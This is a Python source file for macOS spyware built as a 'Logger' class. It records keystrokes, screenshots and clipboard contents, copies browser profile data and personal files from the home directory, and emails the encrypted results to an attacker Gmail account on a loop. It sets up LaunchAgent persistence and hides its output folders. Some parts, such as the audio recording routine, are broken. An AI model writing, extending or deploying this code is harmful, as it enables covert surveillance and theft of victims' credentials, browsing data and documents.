import os
import sys
import time
import shutil
import smtplib
import logging
import threading
import requests
import zipfile
import pygame
import datetime
import platform
import subprocess
from PIL import ImageGrab
from io import BytesIO
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
from pynput import keyboard
import pyperclip


class Logger:
    def __init__(self):
        self.log_file = "system_log.txt"
        self.screenshot_dir = "screenshots"
        self.clipboard_file = "clipboard_log.txt"
        self.browser_data_dir = "browser_data"
        self.audio_file = "audio_recording.wav"
        self.video_file = "video_recording.avi"
        self.stolen_files_dir = "stolen_files"
        self.keylogs = []
        self.smtp_server = "smtp.gmail.com"
        self.smtp_port = 587
        self.email = "hacker@gmail.com"
        self.password = "password123"
        self.ftp_server = "ftp.example.com"
        self.ftp_user = "user"
        self.ftp_pass = "pass"
        self.encryption_key = os.urandom(32)  # 256-bit key for AES
        self.iv = os.urandom(16)  # Initialization vector
        self.setup_directories()
        self.setup_logging()

    def setup_directories(self):
        if not os.path.exists(self.screenshot_dir):
            os.makedirs(self.screenshot_dir)
        if not os.path.exists(self.browser_data_dir):
            os.makedirs(self.browser_data_dir)
        if not os.path.exists(self.stolen_files_dir):
            os.makedirs(self.stolen_files_dir)

    def setup_logging(self):
        logging.basicConfig(filename=self.log_file, level=logging.DEBUG, format='%(asctime)s - %(message)s')

    def on_press(self, key):
        try:
            self.keylogs.append(key.char)
        except AttributeError:
            self.keylogs.append(str(key))
        if len(self.keylogs) > 100:
            self.save_keylogs()

    def save_keylogs(self):
        with open(self.log_file, "a") as f:
            f.write("".join(self.keylogs))
        self.keylogs = []

    def take_screenshot(self):
        try:
            screenshot = ImageGrab.grab()
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = os.path.join(self.screenshot_dir, f"screenshot_{timestamp}.png")
            screenshot.save(filename, "PNG")
            return filename
        except Exception as e:
            logging.error(f"Screenshot error: {str(e)}")
            return None

    def monitor_clipboard(self):
        try:
            data = pyperclip.paste()
            if data:
                with open(self.clipboard_file, "a") as f:
                    f.write(f"{datetime.datetime.now()} - {data}\n")
        except Exception as e:
            logging.error(f"Clipboard error: {str(e)}")

    def steal_browser_data(self):
        try:
            home = os.path.expanduser("~")
            browsers = {
                "Chrome": os.path.join(home, "Library", "Application Support", "Google", "Chrome"),
                "Firefox": os.path.join(home, "Library", "Application Support", "Firefox"),
                "Safari": os.path.join(home, "Library", "Safari")
            }

            for browser, path in browsers.items():
                if os.path.exists(path):
                    try:
                        dest = os.path.join(self.browser_data_dir, browser)
                        if not os.path.exists(dest):
                            os.makedirs(dest)
                        for item in os.listdir(path):
                            s = os.path.join(path, item)
                            d = os.path.join(dest, item)
                            if os.path.isdir(s):
                                shutil.copytree(s, d, symlinks=True)
                            else:
                                shutil.copy2(s, d)
                    except Exception as e:
                        logging.error(f"Browser {browser} error: {str(e)}")
        except Exception as e:
            logging.error(f"Browser data collection error: {str(e)}")

    def record_audio(self, duration=10):
        try:
            pygame.mixer.init()
            pygame.mixer.pre_init(44100, -16, 1, 1024)
            sound = pygame.sndarray.array(pygame.mixer.Sound(self.audio_file))
            pygame.sndarray.save(self.audio_file, sound)
        except Exception as e:
            logging.error(f"Audio recording error: {str(e)}")

    def steal_files(self, extensions=[".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx", ".jpg", ".png", ".sql", ".db"]):
        try:
            for root, dirs, files in os.walk(os.path.expanduser("~")):
                for file in files:
                    if any(file.endswith(ext) for ext in extensions):
                        try:
                            src = os.path.join(root, file)
                            dest = os.path.join(self.stolen_files_dir, file)
                            if not os.path.exists(dest):
                                shutil.copy2(src, dest)
                        except Exception as e:
                            logging.error(f"File copy error {file}: {str(e)}")
        except Exception as e:
            logging.error(f"File stealing error: {str(e)}")

    def encrypt_data(self, data):
        try:
            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(data) + padder.finalize()

            cipher = Cipher(
                algorithms.AES(self.encryption_key),
                modes.CBC(self.iv),
                backend=default_backend()
            )
            encryptor = cipher.encryptor()
            ciphertext = encryptor.update(padded_data) + encryptor.finalize()

            return self.iv + ciphertext  # Prepend IV for decryption
        except Exception as e:
            logging.error(f"Encryption error: {str(e)}")
            return data

    def decrypt_data(self, encrypted_data):
        try:
            iv = encrypted_data[:16]
            ciphertext = encrypted_data[16:]
            cipher = Cipher(
                algorithms.AES(self.encryption_key),
                modes.CBC(iv),
                backend=default_backend()
            )
            decryptor = cipher.decryptor()
            padded_data = decryptor.update(ciphertext) + decryptor.finalize()

            unpadder = padding.PKCS7(128).unpadder()
            data = unpadder.update(padded_data) + unpadder.finalize()

            return data
        except Exception as e:
            logging.error(f"Decryption error: {str(e)}")
            return encrypted_data

    def send_data_email(self, files):
        try:
            msg = MIMEMultipart()
            msg["From"] = self.email
            msg["To"] = self.email
            msg["Subject"] = "Collected Data"
            body = "Data collected from target system"
            msg.attach(MIMEText(body, "plain"))

            for file in files:
                if os.path.exists(file):
                    try:
                        with open(file, "rb") as f:
                            file_data = f.read()

                        encrypted_data = self.encrypt_data(file_data)

                        part = MIMEBase("application", "octet-stream")
                        part.set_payload(encrypted_data)
                        encoders.encode_base64(part)
                        part.add_header("Content-Disposition", f"attachment; filename={os.path.basename(file)}.enc")
                        msg.attach(part)
                    except Exception as e:
                        logging.error(f"Email attachment error {file}: {str(e)}")

            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                server.starttls()
                server.login(self.email, self.password)
                server.send_message(msg)
        except Exception as e:
            logging.error(f"Email sending error: {str(e)}")

    def persist(self):
        try:
            if platform.system() == "Darwin":
                plist_path = os.path.expanduser("~/Library/LaunchAgents/com.user.logger.plist")
                plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.user.logger</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{os.path.abspath(__file__)}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>"""

                os.makedirs(os.path.dirname(plist_path), exist_ok=True)
                with open(plist_path, "w") as f:
                    f.write(plist_content)

                subprocess.run(["launchctl", "load", plist_path], check=True)
        except Exception as e:
            logging.error(f"Persistence error: {str(e)}")

    def hide(self):
        try:
            if platform.system() == "Darwin":
                for path in [self.log_file, self.screenshot_dir, self.browser_data_dir]:
                    if os.path.exists(path):
                        subprocess.run(["chflags", "hidden", path], check=True)
        except Exception as e:
            logging.error(f"Hiding error: {str(e)}")

    def run(self):
        try:
            self.persist()
            self.hide()

            keyboard_listener = keyboard.Listener(on_press=self.on_press)
            keyboard_listener.start()

            threads = [
                threading.Thread(target=self.take_screenshot, daemon=True),
                threading.Thread(target=self.monitor_clipboard, daemon=True),
                threading.Thread(target=self.steal_browser_data, daemon=True),
                threading.Thread(target=self.steal_files, daemon=True)
            ]

            for thread in threads:
                thread.start()

            while True:
                time.sleep(60)
                files_to_send = []
                if os.path.exists(self.log_file):
                    files_to_send.append(self.log_file)
                if os.path.exists(self.clipboard_file):
                    files_to_send.append(self.clipboard_file)

                screenshots = [os.path.join(self.screenshot_dir, f) for f in os.listdir(self.screenshot_dir)
                               if f.endswith('.png')]
                files_to_send.extend(screenshots[:5])

                if files_to_send:
                    self.send_data_email(files_to_send)
        except Exception as e:
            logging.error(f"Main loop error: {str(e)}")


if __name__ == "__main__":
    logger = Logger()
    logger.run()
